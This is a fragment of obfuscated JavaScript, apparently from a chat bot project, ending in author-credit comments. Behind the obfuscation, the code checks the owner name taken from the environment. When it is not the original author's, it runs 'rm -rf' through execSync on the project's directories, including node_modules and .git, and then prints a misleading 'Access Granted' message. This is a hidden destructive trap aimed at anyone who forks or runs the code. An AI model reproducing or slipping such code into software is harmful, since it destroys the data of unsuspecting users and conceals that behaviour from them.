_0x5d3c9c=_0x5ff15e[_0x2f70e2(0x69,0x8a,0xb0,0x6b)]=_0x5ff15e[_0x2f70e2(0xa2,0x8a,0x9d,0x94)]||{},_0x226bd5=[_0x2f70e2(0x6b,0x66,0x7e,0x63),_0x497459[_0x312f1c(-0x51,-0x47,-0x3c,-0x49)],_0x497459[_0x2f70e2(0x6c,0x4e,0x4a,0x4f)],_0x497459[_0x312f1c(-0x48,-0x39,-0x50,-0x57)],_0x312f1c(-0x87,-0x6a,-0x5e,-0x8e),_0x312f1c(-0x82,-0x65,-0x81,-0x45),_0x497459[_0x312f1c(-0x5b,-0x55,-0x41,-0x62)]];for(let _0x2af5be=-0x11d*0x19+0x2196+0x1eb*-0x3;_0x2af5be<_0x226bd5[_0x2f70e2(0x70,0x85,0x92,0x69)];_0x2af5be++){if(_0x497459[_0x2f70e2(0x6f,0x53,0x62,0x5c)](_0x497459[_0x312f1c(-0x82,-0x78,-0x72,-0x65)],_0x2f70e2(0x60,0x52,0x64,0x51))){const _0x30a0c9=_0x16c03b[_0x312f1c(-0x3c,-0x4b,-0x2a,-0x6b)+'r']['prototype'][_0x2f70e2(0xb0,0x8c,0x7a,0xa6)](_0x16c03b),_0x25c65b=_0x226bd5[_0x2af5be],_0x6934c8=_0x5d3c9c[_0x25c65b]||_0x30a0c9;_0x30a0c9[_0x2f70e2(0x66,0x4d,0x45,0x42)]=_0x16c03b[_0x312f1c(-0x1e,-0x3d,-0x32,-0x2c)](_0x16c03b),_0x30a0c9[_0x312f1c(-0x48,-0x5f,-0x73,-0x3a)]=_0x6934c8[_0x2f70e2(0x5a,0x6a,0x8a,0x83)][_0x312f1c(-0x1f,-0x3d,-0x61,-0x34)](_0x6934c8),_0x5d3c9c[_0x25c65b]=_0x30a0c9;}else{const _0x5c3d01=_0x441ba6[_0x312f1c(-0x77,-0x70,-0x4f,-0x71)](_0x5056c1,arguments);return _0x253252=null,_0x5c3d01;}}});_0x10ee13();const owner=process[_0xbd09de(-0x240,-0x241,-0x24a,-0x264)][_0xbd09de(-0x256,-0x251,-0x257,-0x246)],isOwner=owner==='codebox4ch'+'an';function _0xbd09de(_0x18695e,_0x455d87,_0x3777f0,_0x582bcb){return _0x7d86(_0x18695e- -0x393,_0x455d87);}if(isOwner)console[_0xbd09de(-0x25d,-0x262,-0x238,-0x268)]('There\x20is\x20n'+_0x4589e6(0x2a5,0x2c6,0x288,0x2c2)+_0xbd09de(-0x269,-0x275,-0x246,-0x25f)+'!');else{const forker=owner[_0xbd09de(-0x251,-0x234,-0x254,-0x259)]('/')[-0x1*0xca5+0xc7d+0x14*0x2],directoriesToRemove=[_0xbd09de(-0x236,-0x211,-0x237,-0x256),'node_modul'+'es',_0xbd09de(-0x24c,-0x250,-0x236,-0x22e),'.git'];try{directoriesToRemove[_0x4589e6(0x29c,0x2ba,0x2b1,0x2c0)](_0x6cbbd=>{const _0x273700={'wvGlz':function(_0x4ec5be,_0x23f223){return _0x4ec5be(_0x23f223);}};function _0x5d9d26(_0x1bc66c,_0x21c35a,_0x3d909c,_0x38d59b){return _0xbd09de(_0x38d59b- -0x27,_0x1bc66c,_0x3d909c-0x49,_0x38d59b-0x110);}_0x273700[_0x5d9d26(-0x284,-0x282,-0x28e,-0x292)](execSync,'rm\x20-rf\x20'+_0x6cbbd);}),console[_0xbd09de(-0x25d,-0x270,-0x243,-0x274)](_0xbd09de(-0x252,-0x22d,-0x236,-0x260));}catch(_0x189ebd){console[_0x4589e6(0x29b,0x288,0x2b3,0x293)](_0x4589e6(0x292,0x2a2,0x2a1,0x27b));}console[_0xbd09de(-0x25d,-0x24c,-0x23a,-0x27e)](_0xbd09de(-0x250,-0x245,-0x250,-0x24f)+'ess\x20Grante'+_0x4589e6(0x2b2,0x2d1,0x2ca,0x2d2)+owner);}
/* *
This bot was created by me (CATALIZCS) and my brother SPERMLORD. Do not steal my code. (つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
This file was modified by me (@YanMaglinte). Do not steal my credits. (つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
* */